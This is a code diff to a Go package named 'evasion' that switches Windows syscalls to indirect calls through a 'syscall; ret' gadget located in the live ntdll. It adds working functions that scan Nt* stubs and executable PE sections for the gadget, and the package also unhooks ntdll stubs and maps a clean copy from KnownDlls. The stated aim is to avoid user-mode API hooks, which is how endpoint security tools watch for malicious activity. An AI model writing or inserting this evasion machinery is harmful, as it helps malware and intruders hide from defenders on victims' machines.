@@ -2,8 +2,9 @@
 
 // Package evasion provides indirect syscall machinery: SSN resolution from a
 // clean ntdll copy mapped out of \KnownDlls (with a live-scan fallback) and
-// typed Nt* wrappers that execute the syscalls directly, bypassing
-// user-mode API hooks.
+// typed Nt* wrappers that issue syscalls by CALLing a `syscall; ret` gadget
+// inside ntdll, so RIP is in ntdll at SYSCALL time and user-mode API hooks
+// on export entries are never reached.
 package evasion
 
 import (
@@ -51,6 +52,10 @@ var (
 	sysErr     error
 	unhooked   int
 	cleanNtdll uintptr
+	// syscallAddr is the live-ntdll address of a `syscall; ret`
+	// (0F 05 C3) gadget — the indirect-syscall target. Set once inside
+	// resolve() before any call() invocation; read-only thereafter.
+	syscallAddr uintptr
 )
 
 type sysTable struct {
@@ -100,15 +105,17 @@ func initSys() error {
 	return sysErr
 }
 
-// invokeSyscall executes the syscall directly; implemented in syscall_amd64.s.
-func invokeSyscall(ssn, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11 uintptr) uintptr
+// invokeSyscall issues an indirect syscall by CALLing the ntdll
+// syscall;ret gadget at syscallAddr; implemented in syscall_amd64.s.
+func invokeSyscall(ssn, syscallAddr, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11 uintptr) uintptr
 
-// call is a trampoline into the syscall; the syscall instruction reads args
-// 5..11 from the stack, so all slots are passed.
+// call is a trampoline into invokeSyscall; the syscall instruction reads
+// args 5..11 from the stack, so all slots are passed. syscallAddr is the
+// gadget resolved once by resolve().
 func call(ssn uint32, a ...uintptr) uintptr {
 	var v [11]uintptr
 	copy(v[:], a)
-	return invokeSyscall(uintptr(ssn), v[0], v[1], v[2], v[3], v[4], v[5], v[6], v[7], v[8], v[9], v[10])
+	return invokeSyscall(uintptr(ssn), syscallAddr, v[0], v[1], v[2], v[3], v[4], v[5], v[6], v[7], v[8], v[9], v[10])
 }
 
 func resolve() error {
@@ -119,6 +126,14 @@ func resolve() error {
 	if liveBase == 0 {
 		return errors.New("evasion: GetModuleHandleW(ntdll.dll) failed")
 	}
+
+	// Indirect-syscall target must be ready before the first call()
+	// (mapCleanNtdll and unhookStubs both go through call()).
+	gad, gadOK := findSyscallGadget(toPtr(liveBase))
+	if !gadOK {
+		return errors.New("evasion: syscall;ret gadget not found in ntdll")
+	}
+	syscallAddr = gad
 
 	var boot sysTable
 	var ok bool
@@ -217,6 +232,62 @@ func mapCleanNtdll(boot sysTable) (uintptr, func(), error) {
 		call(boot.unmapView, CurrentProcess, base)
 		call(boot.closeHandle, sec)
 	}, nil
+}
+
+// findSyscallGadget locates a `syscall; ret` (0F 05 C3) sequence in the
+// live ntdll image at base. It prefers a real Nt* stub (stays inside
+// .text on a known-executable page) and falls back to scanning executable
+// PE sections. The clean KnownDlls mapping is PAGE_READONLY and cannot be
+// CALLed, so the gadget always comes from the live image.
+func findSyscallGadget(base unsafe.Pointer) (uintptr, bool) {
+	for _, h := range []uint32{hashNtClose, hashNtOpenProcess, hashNtProtectVM, hashNtAllocateVM, hashNtOpenSection} {
+		fn, err := resolveExport(base, h)
+		if err != nil {
+			continue
+		}
+		if addr, ok := gadgetInStub(fn); ok {
+			return addr, true
+		}
+	}
+	return gadgetInImage(base)
+}
+
+// gadgetInStub scans the first stubPatchLen-ish bytes of a function for
+// an adjacent `syscall; ret` pair.
+func gadgetInStub(fn unsafe.Pointer) (uintptr, bool) {
+	for i := 0; i < 0x40; i++ {
+		if rd8(unsafe.Add(fn, i)) == 0x0F && rd8(unsafe.Add(fn, i+1)) == 0x05 && rd8(unsafe.Add(fn, i+2)) == 0xC3 {
+			return uintptr(unsafe.Add(fn, i)), true
+		}
+	}
+	return 0, false
+}
+
+// gadgetInImage walks executable PE sections and returns the first
+// `syscall; ret` (0F 05 C3) byte sequence.
+func gadgetInImage(base unsafe.Pointer) (uintptr, bool) {
+	nt := unsafe.Add(base, uintptr(rd32(unsafe.Add(base, 0x3C))))
+	numSections := rd16(unsafe.Add(nt, 6))
+	optSize := rd16(unsafe.Add(nt, 20))
+	sect := unsafe.Add(nt, 24+uintptr(optSize))
+	for i := uint16(0); i < numSections; i++ {
+		s := unsafe.Add(sect, uintptr(i)*40)
+		if rd32(unsafe.Add(s, 36))&0x20000000 == 0 { // IMAGE_SCN_MEM_EXECUTE
+			continue
+		}
+		vsize := uintptr(rd32(unsafe.Add(s, 8)))
+		vaddr := uintptr(rd32(unsafe.Add(s, 12)))
+		if vsize == 0 || vsize > 0x4000000 {
+			continue
+		}
+		for j := uintptr(0); j+2 < vsize; j++ {
+			p := unsafe.Add(base, vaddr+j)
+			if rd8(p) == 0x0F && rd8(unsafe.Add(p, 1)) == 0x05 && rd8(unsafe.Add(p, 2)) == 0xC3 {
+				return uintptr(p), true
+			}
+		}
+	}
+	return 0, false
 }
 
 // resolveSSN locates the function for the djb2-hashed name and extracts its
